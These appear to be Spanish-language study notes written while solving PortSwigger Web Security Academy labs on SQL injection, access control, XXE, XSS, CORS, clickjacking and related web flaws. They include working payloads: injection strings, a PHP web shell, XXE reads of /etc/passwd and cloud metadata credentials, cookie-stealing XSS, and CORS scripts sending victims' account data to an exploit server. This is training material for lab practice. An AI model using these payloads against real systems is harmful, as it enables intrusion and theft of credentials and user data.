	####SQL Injection
	###Definicion
Es una vulnerabilidad donde un atacante puede acceder a los datos de la base de datos.
	###Vulnerabilidades
	##Basic
Retriving hidden data: Consta de modificar una query para obtener mas data.
Un ejemplo de esto seria modificar https://insecure-website.com/products?category=Gifts por https://insecure-website.com/products?category=Gifts'--
Gracias a -- le estamos diciendo que ignore todo lo que sigue en la query. generando que, la query no tenga mas variables.
SELECT * FROM products WHERE category = 'Gifts' AND released = 1; generando que luego del cambio sea:
#Esta seria la query original sin modificar
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1; ignorando lo siguiente al --
#Esta seria la query resultante luego de modificar la busqueda

Tambien se puede intentar que la aplicacion devuelva TODO lo que posee (en este caso articulos para comprar) agregando OR 1=1 generando que la query se vea tal que:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
#Esta query buscaria todo donde categorya sea gift o 1=1 o sea, donde sea gift o true

Subverting application logic: Se trata de cambiar la query para hacerla interferir con la logica de la aplicacion.
Esto se puede ver aplicado mas que nada en pantallas de logueo donde al agregar -- en el usuario se podria obviar la password ya que la query podria quedar como:
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
#Query con administrator'-- en username

UNION attacks: Se generan usando la palabra UNION para poder ejecutar mas querys SELECT. Esto se realiza agregando al input la query UNION
' UNION SELECT username, password FROM users--
#Agregando esto en el input donde se debe ingresar el dato a buscar, se puede ver la data solicitada.

Examining the database:Se trata de poder obtener informacion de la base de datos gracias a la vulnerabilidad
SELECT * FROM information_schema.tables
#Obtener informacion sobre las tablas que posee la DB

Blind SQL injection: Se refiere a una DB vulnerable que no devuelve el resultados de la SQL injection ni errores. Aun asi pueden explotarse.

lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data 
consta de consultas mediante peticiones GET las cuales pueden ser manipuladas.
Para verificar dicha vulnerabilidad solo hay que ingresar algun caracter como comillas simples para saber si nos devuelve un error puesto que la query
se romperia.
Una vez determinado esto hay una serie de elementos que permiten poder ver que hay por detras:
'' OR 1=1 --
#Con esto estamos diciendo que devuelva WHERE elemento = '' OR 1=1
#Esto es siempre true por lo que va a mostrar todo

lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass) 
Consta de una pagina de login donde se puede aplicar lo mismo de arriba.
Si pasamos el usuario, cerramos las comillas (') y luego agregamos -- para que no tome en cuenta otros parametros para que la query sea
true como puede ser la password, podriamos acceder.
user: Administrator'--
password: asd
#Esto se utilizo en el lab para resolverlo. En este caso la query sea (seguramente) SELECT something FROM users WHERE user = <'user'> and password <'password'>

	####Authentication
	###Definicion
	###Basico
lab https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
Un problema ya no tan comun es la de aclararle al usuario que la contraseña es incorrecta o que el usuario es incorrecto. Cuando esto se le dice por separado a la persona que quiere ingresar
es un potencial vector de ataque para listar usuarios y, posteriormenete contraseñas.
Para esto se utiiza el INTRUDER de burp suite: Se realiza la request, se lo manda al intruder, se selecciona para que se modifique solo el usuario y mediante el 
Length podemos ver si las rta es distinta. En el caso que lo sea quiere decir que el mensaje de error que nos aparece es distinto dandonos a saber que
el usuario es correcto pero la password no. El mismo proceso se para la password.

lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
Este problema se da dado que el 2FA se puede bypassear cambiando la url para que nos dirija hacia la cuenta. El problema viene dado ya que al ingresar las credenciales
la webapp te loguea y el 2FA esta en el medio solo para redirigirte hacia tu cuenta.

lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
En este laboratorio se da un error en la logica con la que se resetea la contraseña dado que en la request viaja en cleartext el usr al cual se le va a cambiar la contraseña
Esto genera que la peticion pueda modificarse, ponerse otro usuario y que se cambie la contraseña de este si el usr existe.

	####Directory traversal
	###Definicion
	###Basico
lab: https://portswigger.net/web-security/file-path-traversal/lab-simple
Esta vulnerabilidad consta en poder listar archivos gracias a la forma en la que la web app obtiene las imagenes de los productos.

filename=xx.jpg
#De esta forma, la web app busca el archivo xx.jpg en el directorio.

filename=/../../../etc/passwd
#Gracias a la forma de buscar y que no se limpia lo que se le pide, podemo slistar archivos del sistema

	####Business logic
	###Definicion
	###Basic
lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
La confianza en el usuario puede generar problemas de seguridad. En este caso el problemas se da a causa de que el precio esta en cleartext en la request.
Esto puede ser modificado para que se tome como precio real uno que no es el del producto. Basta con cambiar el precio al agregarlo al carrito para que suceda esto.

lab:https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
Lo anterior esta solucionado pero esta vez el problema esta en la cantidad de items que se pueden agregar al carrito siendo posible un nro negativo generando
que el precio vaya hacia abajo. De esta forma se puede comprar algo con un precio menor al estipulado.

lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
En este lab se ve un problema de falta de controles donde con simplemente cambiar el mail al dominio de la empresa, ya te permite entrar al panel de admin
al que tienen accesos todas las personas con mail @empresa.com

lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
La pagina tiene cupones, podes tener hasta 2 y no te deja ingresar de nuevo el ultimo agregado. Al solo verificar sobre el ultimo agregado, si tenes 2 cupones
vas alternando entre 1 y otro para poder obtener el descuento total del producto.

	####Access control vulnerabilities
	###Definicion
	###Basic
lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
En robots.txt esta el admin panel. Dicho panel es accesible para todos

lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url
robots.txt no esta o no es accesible. El panel de admin esta en el codigo de la apagina (ctrl + u) como una sentencia if

lab: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
Interpectando con burpsuite, se puede ver como al loguearnos aparece una cookie de admin:false en la respnse. Cambiando a true se puede acceder al panel.

lab: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile
Al cambiar el mail, si vemos la response se puede ver un "roleid":1. Si al json donde se encuentra el nuevo mail le agregamos "roleid":2, en la response
va a venir el roleid en 2, no en uno. Una vez hecho esto nos aparece el panel de admin.

lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter
EL perfil del usuario posee una API key y un parametro en la URL para el usuario. Si se cambia el usuario se puede ver la API key de dicho usr.

lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
La idea es la misma que el anterior pero en vez de nombres usa un ID imposible de adivinar. Dicho ID es exfiltrado en los post que hace el usuario donde en el link al perfil se encuentra
el ID de el usuario que creo la entrada del blog. Cambiando ese ID se puede ver la API key del usr

lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect
La api key la encontramos en el redirect que nos hace hacia el login cuando intentamos cambiar el parametro de la URL al usr carlos.

lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure
Se puede resolver de dos formas. Al ir al perfil de la cuenta, nuevamente se puede cambiar de usuario mediante la url. 
En el perfil se encuentra la password en formato password, se puede:
1: Interceptar la response mediante burp y verlo en texto claro
2: Inspeccionar elemento y cambiar el type:"password" a type:"text"

lab: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
Se puede descargar la transcricpion de los chats. Dicha descarga se hace mediante una request que se puede editar generando asi poder descargar transcripciones de otras personas.
En este caso, descargo un chat donde carlos decia su password.

	####File upload vulnerabilities
	###Definicion
	###Basic
lab: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
Se puede subir un php como imagen. Al ir hacia la ubicacion donde se almacena podemos usarlo de shell. Shell usada: <?php system($_GET["cmd"]); ?>

lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
Similar al anterior pero se filtra lo que se puede subir. Para bypasear esto solo se debe ver la request de subida de archivo y cambiar el content-type a image/jpeg y dejar la extension del archivo como php.
Una vez hecho esto, la pagina acepta exploit y podemos usarlo.

	####XML external entity (XXE) injection
	###Definicion
	###Basic
lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
El lab presenta una funcion de stock que busca mediante XML. Para obtener informacion del sistema podemos agregar entre la declaracion de xml y la primer sentencia el siguinete codigo:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
#Esto nos permite buscar el archivo etc/passwd en el sistema

Una vez agregado el codigo, se debe llamar a xxe cambiando el productId por &xxe;
Nos devuelve un mensaje de error pero justo debajo de eso imprime el archivo

lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
La idea del lab es la misma pero con la diferencia de que en vez de buscar un archivo mediante /xxxx/xxxx se busca con la ip, obteniendo los folders e ir reemplazandolo en el codigo:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
#A partir de latest es lo que se va obteniendo al querer obtener xxe hasta llegar ala SecretKey

	####Cross-site scripting (XSS)
	###Definicion
XSS es una vulnerabilidad que permite al atacante comprometer a un usuario interactuando con una aplicacion vulnerable.
Comunmente, para saber si una aplicacion es vulnerable, se utiliza payload para que se ejecute JavaScript. Una funcion comun para esto es alert()
Chrome, arreglo esto de la funcion alert para que no pueda ser llamada. En estos casos puede usarse print().

	###Vulnerabilidades
Reflected XSS: El script viene en la request del HTTP.
https://insecure-website.com/status?message=All+is+well.
#Un ejemplo con alert seria: https://insecure-website.com/status?message=All+is+well.<script>alert()</script>

"onmouseover="alert(1)

Stored XSS: El script viene de la base de datos con source no confiable sin control de la data.

Hello, this is my message!
<script>alert()</script>
#Esto suele darse en comentarios (por ejemplo) usando alert como ejemplo el comentario se veria asi
#De esta forma, todos los que vean el comentario recibiran el alert()
javascript:alert(1)
#JavaScript URL
'-alert(1)-'
#JavaScript string

DOM-based XSS: Se da cuando una aplicacion contiene client-side JavaScript que procesa data de forma incorrecta desde una fuente no confiabvle.
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
#"><svg onload=alert(1)>
#<img src=1 onerror=alert(1)>

javascript:alert(document.cookie)

<iframe src="https://0a1000e6038d057a8077a32100510031.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

	####Cross-site request forgery
	###Definicion
CSRF es un vulnerabilidad que le permite al atacante inducir a usuarios a realizar acciones que ellos no pretendian realizar. Un ejemplo de esto puede ser cambiar el mail de la cuenta o la contraseña.
Para que este ataque sea posible deben darse 3 ondiciones.

Accion relevante: Accion en la aplicacion que el atacante tenga razones a inducir.
Cookie-based session handling: Las acciones se realizan mediante request HTTPs por lo que la aplicacion use las cookies unicamente para identificar a un usuario seria beneficioso para el atacante.
Parametros predecibles en request: Se refiere a request con parametros que el atacante puede adivinar. Un ejemplo de esto seria que para cambiar la password la funcion es vulnerable si no se necesita saber la actual.

Si encontramos una funcionalida de la aplicacion la cual puede desencadenar en CSRF, podemos utilizar la seccion action para generar un CSRF PoC con la request interceptada.

	####Cross-origin resource sharing (CORS)
	###Definicion
CORS es un mecanismo de los navegadores que permiten el control de accesos a recursos fuera del dominio el cual extiende la flexibilidad de Same origin policy. 
Muchas paginas tienen que interactuar con subdominios o 3ros de cofnianza que requieren cross origin access, para ello esta CORS.
Aun asi, si esta mal implementado o pobremente configurado, CORS no es una proteccion contra cross origin attacks
*Same Origin Policy (SOP) limita la habilidad del navegador de interactuar con recursos fuera del dominio. 

	###Vulnerabilidades
	##Basic
Server-generated ACAO header from client-specified Origin header: Las aplicaciones deben comunicarse con otros dominios generando que deba haber una lista de aquellos permitidos.
Algunas aplicaciones toman el camino sencillo de permitir accesos desde cualquier dominio y, para esto, se puede leer el origin header de la request incluyendo el header donde menciona el origen. Si al cambiar esto, la response sigue aceptando el origin como valido, es vulnerable.
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','page/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
#Ejemplo de script para obtener detalles de la cuenta de la victima.

Errors parsing Origin headers: Muchas veces los origines se aceptan o no mediante una whitelist, tambien muchas veces sucede que se acepta de subdominios existentes y futuros, generando esta vulnerabilidad.
Puede estar confirgurado para aceptar origenes que empiecen o terminen de una determinada forma, generando una via de ataque.

Whitelisted null origin value: Se da cuando se acepta origen null generando una response 200 ok.
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
#iframe sandbox genera una null request. Haciendo asi que este sea un ejemplo para la vulnerabilidad

	####Clickjacking
	###Definicion
Es la accion en la que un usuario es inducido a clickear sobre un contenido accionable oculto en un website.
	###Vulnerabilidades
	##Basic
How to construct a basic clickjacking attack: Estos ataques usan CSS para crear y manupular capas para que el usuario clickee en otra cosa de la que quiere.
Esto se suele lograr on un iframe.
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af6001304a6dc2e805aa44b0059009c.web-security-academy.net/my-account"></iframe>
#Ejemplo de un clickjacking basico (lab 1)

Clickjacking with prefilled form input:
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:525px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a7c004f033d7855c6aae11000670020.web-security-academy.net/my-account?email=gabooo@attacker-website.com"></iframe>
#Tambien se puede asignar una accion a la pagina como para cambiar el nombre y hacer click en el boton que genera la accion

